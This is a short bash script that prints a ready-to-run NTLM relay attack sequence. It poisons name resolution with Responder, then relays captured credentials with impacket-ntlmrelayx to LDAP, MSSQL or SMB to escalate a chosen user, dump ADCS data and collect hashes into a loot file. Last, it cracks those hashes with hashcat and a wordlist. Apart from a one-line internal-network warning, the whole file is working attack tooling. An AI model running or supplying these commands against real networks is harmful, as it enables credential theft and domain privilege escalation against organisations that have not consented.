#!/usr/bin/env bash
# Description: NTLM relay attacks — relay to LDAP, MSSQL, SMB for privilege escalation
TARGET="${1:-}"; ACTION="${2:-ldap}"; ESCALATE_USER="${3:-}"
[[ -z "$TARGET" ]] && { echo "Usage: bash ntlm_relay.sh <TARGET> [ldap|mssql|smb] [escalate_user]"; echo "  bash ntlm_relay.sh 10.0.0.10 ldap Administrator"; exit 1; }
echo -e "\n=== NTLM RELAY — Target: $TARGET | Action: $ACTION ===\n"
echo "[*] Step 1: Start Responder (separate terminal):"; echo "  sudo responder -I eth0 -A"
echo ""
echo "[*] Step 2: Relay captured hashes:"
case "$ACTION" in
    ldap)
        echo "  sudo impacket-ntlmrelayx -t ldap://$TARGET --escalate-user ${ESCALATE_USER:-Administrator} --dump-adcs"
        echo "  # This adds the user to Enterprise Admins if ADCS is present" ;;
    mssql)
        echo "  sudo impacket-ntlmrelayx -t mssql://$TARGET -q"
        echo "  # Execute SQL queries with relayed credentials" ;;
    smb)
        echo "  sudo impacket-ntlmrelayx -tf targets.txt -smb2support -of loot_hashes.txt"
        echo "  # Relay to SMB, execute commands, dump hashes" ;;
    *)
        echo "  sudo impacket-ntlmrelayx -t ${ACTION}://$TARGET -smb2support" ;;
esac
echo ""
echo "[*] Step 3: Process captured hashes:"; echo "  hashcat -m 5600 loot_hashes.txt /usr/share/wordlists/rockyou.txt --force"
echo -e "\n⚠️  Internal network ONLY — requires MITM position\n"
EOF

